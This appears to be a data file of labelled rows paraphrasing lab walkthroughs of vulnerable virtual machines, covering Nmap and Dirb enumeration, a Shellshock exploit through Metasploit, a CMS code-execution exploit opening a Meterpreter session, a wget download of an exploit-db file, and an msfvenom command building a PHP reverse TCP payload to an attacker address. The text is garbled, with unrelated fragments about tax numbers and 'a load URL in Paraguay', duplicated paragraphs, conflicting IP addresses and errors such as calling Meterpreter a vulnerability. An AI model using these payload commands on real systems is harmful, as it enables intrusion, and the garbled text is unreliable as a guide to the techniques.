1190,Exploitation,"The process involves exploiting the shellshock vulnerability through the Metasploit framework and escalating privileges to gain root access. With all the necessary information at hand, let's initiate the challenge. Upon launching the downloaded virtual machine in VirtualBox, the machine is automatically assigned an IP address from the network's DHCP. This IP address is visible on the login screen, as depicted in the accompanying screenshot. The target machine's IP address is noted as 192.168.1.24, with 192.168.1.25 designated as the attacker machine's IP address for relevant operations. It's worth noting that the target machine's IP address may differ depending on network DHCP assignment. There's no need to execute the Netdiscover command to obtain the target IP address, as it's automatically displayed. With the target machine's IP address acquired, the subsequent step involves identifying the open ports and services available. Utilizing the Nmap tool, which is readily accessible on Kali Linux, we conduct a comprehensive scan. The outcomes reveal the available open ports and services. Subsequently, we focus on exploring the HTTP port 8080 of the target machine by accessing it via a web browser. Upon inspection, we find a web application running, presumably a banking application based on the text observed. Notably, a login form is accessible on the homepage. To further probe the target, we utilize the Dirb tool, renowned for its efficacy in web application file and directory enumeration."
1190,Exploitation,"The Dirb tool comes pre-installed in Kali Linux for easy access. Below are the results of the scan. Upon analyzing the scan findings, we discovered that directory listing is enabled on the target machine."
1190,Exploitation,"Opting for a comprehensive scan for files and folders, we initiated a Dirbuster scan. The command and subsequent results are displayed in the following screenshot. Upon examination, we discovered a Shell script file situated in the ""cgi-bin"" directory within the target application. Further investigation revealed that the file is susceptible to the shellshock vulnerability, as confirmed through internet research. Additionally, an exploit for this vulnerability is accessible in the Metasploit Framework, as evidenced by the exploit information depicted in the accompanying screenshot. We reviewed the exploit description on the Rapid7 website and proceeded to exploit the vulnerability through the Metasploit framework in the subsequent step."
1190,Exploitation,"The document provides details regarding the Goods and Services Tax Identification Number (GSTIN) and the corresponding GST rates applicable to various products and services. This suggests a potential vulnerability to shellshock in the Apache server. For further insights, refer to the <https://owasp.org/www-pdf-archive/Shellshock - Tudor Enache.pdf>. To proceed, a shell script must exist on the machine, and I speculated the filename to be shell.sh. However, this can be verified through testing with dirb http://10.0.0.5/cgi-bin -X .sh vl. It's important to note that gobuster, by default, does not capture status code 500, so it may not detect this file on the website. In the subsequent step, exploitation will be conducted via the Metasploit framework."
1203,Executing,"However, I'll attempt to simplify the explanation. The script creates a payload capable of manipulating a remote computer (the target) via a vulnerability known as ""meterpreter."" This PHP-based payload allows the attacker to retrieve information about the target's IP address and port number. Upon reaching the target, the payload deactivates error reporting, establishes a connection with the attacker's server, and executes the malicious code. Moving forward, exploitation will be carried out using the Metasploit framework."
1203,Executing,"The objective is to remotely execute code on the target machine. Initially, the tool configures the remote host to 192.168.1.101 and the URI to ""/cms/"". Subsequently, it initiates a reverse TCP handler on the attacker's system, specifying the IP address as 192.168.1.109 and port number as 4444. Then, a payload is dispatched to the target machine utilizing the discovered page parameter ""/cms/index.php?page=index"". Successfully exploiting the vulnerability, a Meterpreter session is established between the attacker's and target machines via port 4444. The target system is identified as ""typhoon.local,"" operating on Linux with version 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:54."
1203,Executing,"The tool proceeds by indicating its version as ""meterpreter > sysinfo,"" affirming its PHP/Linux nature. Following this, the exploitation is initiated using the command ""msf exploit(multi/http/lcms php exec) > exploit."" The remote host is then set to 192.168.1.161, and subsequently, the URI is configured to ""/cms/."" Upon executing the exploit, a reverse TCP handler is initiated on 192.168.1.109:4444, and a payload of 38247 bytes is dispatched to 192.168.1.101. The exploit confirms the PHP/Linux environment. Additionally, there's a reference to the ""Typhoon: 1.02 Vulnhub Walkthrough"" with three thoughts provided."
1203,Executing,"The details were also shared across various online platforms such as KaliDocs and KaliForums. The content appears to depict a sequence of commands and procedures executed on a computer, likely aimed at fetching and executing an exploit. Initially, the command changes the current directory to ""/home/vivek"", succeeded by a series of cd (change directory) commands navigating to the directory ""Zvar/ww/htm"". Subsequently, wget is employed to download a file from ""https://wm.exploit-db.com/download/44298"". The subsequent lines document the download progress, with the file being saved as '44298'."

These instructions detail how to execute a load URL in Paraguay, incorporating parameters like SQL injection, cross-site scripting (XSS), encryption, encoding, and other functionalities."
1204002,Initiating,"Now, with only 2 flags remaining, it's time to establish shell access since we have WordPress. Proceeding further, begin by generating a PHP code using ""msfvenom"" to facilitate this. The command ""msfvenom -p php/meterpreter/reverse tcp lLhost=192.168.0.104 lport=4444 -f r"" illustrates the process. This command is employed within a cybersecurity tool known as ""msfvenom,"" crafted to produce tailored malicious payloads for diverse attack scenarios. Specifically, the command generates a PHP-based reverse TCP payload, specifying an IP address (lhost), and configuring certain options such as platform and architecture. The output suggests that default settings were applied since no explicit platform or encoding was selected.

So, now we have all the information we need, let's get started with the challenge.. After running the downloaded virtual machine in the virtual box, the machine will automatically be assigned an IP address from the network DHCP.. It will be visible on the login screen. The target machine??s IP address can be seen in the following screenshot.. The target machine IP address is 192.168.1.24, and we will be using 192.168.1.25 as the attacker machine IP address wherever required.. Note: the target machine IP address may be different in your case, as the network DHCP assigns it.. We do not need to run the Netdiscover command for this machine to get the target IP address as it is automatically assigned and displayed on the screen.. Now that we have the target machine IP address, the next step is to find out the open ports and services available on the machine.. After getting the target machine's IP address, the next step is to find out the open ports and services available on the machine. We will use the Nmap tool, as it works effectively and is available by default on Kali Linux. The results can be seen below:. Let's start enumerating the target machine by exploring the HTTP port 8080. We opened the target machine IP address on the browser, which can be seen below:. A web application is running on the target machine, and by the text, we assume it is a banking application.. There is a login form available on the home page.. For this purpose, we used the Dirb tool, which is widely used for web application files and directory enumeration.."

The script generates a payload that can be used to control a remote computer (the target) through a vulnerability called ""meterpreter."" This payload is written in PHP code and can send the attacker information about the target's IP address and port number. Once the payload reaches the target, it disables error reporting, connects to the attacker-controlled server, and executes the malicious code."

Then, it starts a reverse TCP handler on the attacker's computer with IP address 192.168.1.109 and port number 4444. Next, a payload is sent to the target computer with the found page parameter ""/cms/index.php?page=index"". The exploit is successful, and a Meterpreter session is opened between the attacker's computer and the target computer on port 4444.
